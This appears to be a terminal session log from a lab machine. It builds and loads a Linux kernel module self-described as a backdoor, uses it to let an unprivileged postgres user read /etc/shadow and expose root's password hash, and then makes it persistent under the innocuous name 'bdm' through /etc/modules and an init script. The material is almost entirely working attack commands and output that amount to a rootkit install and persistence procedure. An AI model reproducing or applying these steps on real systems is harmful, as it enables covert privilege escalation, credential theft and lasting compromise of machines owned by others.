
```
root@labs:/tmp/sunxi-debug-backdoor# ll
total 8
-rw-r--r-- 1 root root  580 Apr 28 01:56 Makefile
-rw-r--r-- 1 root root 3520 Apr 28 01:57 sunxi-debug-backdoor.c

root@labs:/tmp/sunxi-debug-backdoor# make 
echo make -C /lib/modules/4.15.0-kali2-amd64/build M=/tmp/sunxi-debug-backdoor LDDINC=/tmp/sunxi-debug-backdoor/../include modules
make -C /lib/modules/4.15.0-kali2-amd64/build M=/tmp/sunxi-debug-backdoor LDDINC=/tmp/sunxi-debug-backdoor/../include modules
make -C /lib/modules/4.15.0-kali2-amd64/build M=/tmp/sunxi-debug-backdoor LDDINC=/tmp/sunxi-debug-backdoor/../include modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-kali2-amd64'
  CC [M]  /tmp/sunxi-debug-backdoor/sunxi-debug-backdoor.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/sunxi-debug-backdoor/sunxi-debug-backdoor.mod.o
  LD [M]  /tmp/sunxi-debug-backdoor/sunxi-debug-backdoor.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-kali2-amd64'
```

```
root@labs:/tmp/sunxi-debug-backdoor# modinfo sunxi-debug-backdoor.ko
filename:       /tmp/sunxi-debug-backdoor/sunxi-debug-backdoor.ko
description:    Adds a backdoor to the linux kernel
author:         sunxi-debug
license:        GPL
depends:        
retpoline:      Y
name:           sunxi_debug_backdoor
vermagic:       4.15.0-kali2-amd64 SMP mod_unload modversions 
```

```
root@labs:/tmp/sunxi-debug-backdoor# insmod sunxi-debug-backdoor.ko
root@labs:/tmp/sunxi-debug-backdoor# su postgres
postgres@labs:/tmp/sunxi-debug-backdoor$ echo password > /proc/mod/bdm 
postgres@labs:/tmp/sunxi-debug-backdoor$ head -1 /etc/shadow
root:$6$E0QR7VVm$Wys9sf3ClDAMJA7an.c5uG.3koaBhibZNoBJPnTVH5FI59/jem9BP4wFybER2hO4PqxdsXmhYWf5blMAGbiSl/:17635:0:99999:7:::
postgres@labs:/tmp/sunxi-debug-backdoor$ exit
exit
root@labs:/tmp/sunxi-debug-backdoor# rmmod sunxi_debug_backdoor 
```

```
root@labs:~/exploits/kernel# cp sunxi_debug_backdoor.ko /lib/modules/`uname -r`/misc/bdm.ko
root@labs:~/exploits/kernel# depmod
root@labs:~/exploits/kernel# modprobe bdm
root@labs:~/exploits/kernel# modprobe -r bdm
```

```
root@labs:~# cat /etc/modules
# /etc/modules: kernel modules to load at boot time.
#
# This file contains the names of kernel modules that should be loaded
# at boot time, one per line. Lines beginning with "#" are ignored.

bdm
```


```
root@labs:~/exploits/kernel# cat /etc/init.d/bdm
#! /bin/sh
# Linux kernel module init script

# chkconfig: 35 30 70
# description: BDM Linux kernel module
#

### BEGIN INIT INFO
# Provides:       bdm
# Required-Start:
# Required-Stop:
# Default-Start:  2 3 4 5
# Default-Stop:   0 1 6
# Short-Description: BDM Linux kernel module
### END INIT INFO

. /lib/lsb/init-functions

running()
{
    lsmod | grep -q "$1[^_-]"
}

start()
{
    echo "Loading BDM kernel modules..."
    
    if ! running bdm; then
        if ! modprobe bdm > /dev/null 2>&1; then
            if ! find /lib/modules/`uname -r` -name "bdm" 2>/dev/null|grep -q bdm; then
                echo "No suitable module for running kernel found"
            else
                echo "modprobe vboxdrv failed. Please use 'dmesg' to find out why"
            fi
            return 1
        else
            echo "bdm"
        fi
    fi
}

stop()
{
    echo "Unloading BDM kernel modules..."
    
    if running bdm; then
        if ! rmmod bdm 2>/dev/null; then
            echo "Cannot unload module bdm"
            return 1
        else
            echo "bdm"
        fi
    fi
    
}

case "$1" in
start)
    start
    ;;
stop)
    stop
    ;;
restart|force-reload)
    stop && start
    ;;
status)
    ;;
*)
    echo "Usage: $0 {start|stop|restart|force-reload|status}"
    exit 1
esac

root@labs:~/exploits/kernel# ln -s /etc/init.d/bdm /etc/rc0.d/K01bdm 
root@labs:~# update-rc.d bdm defaults
```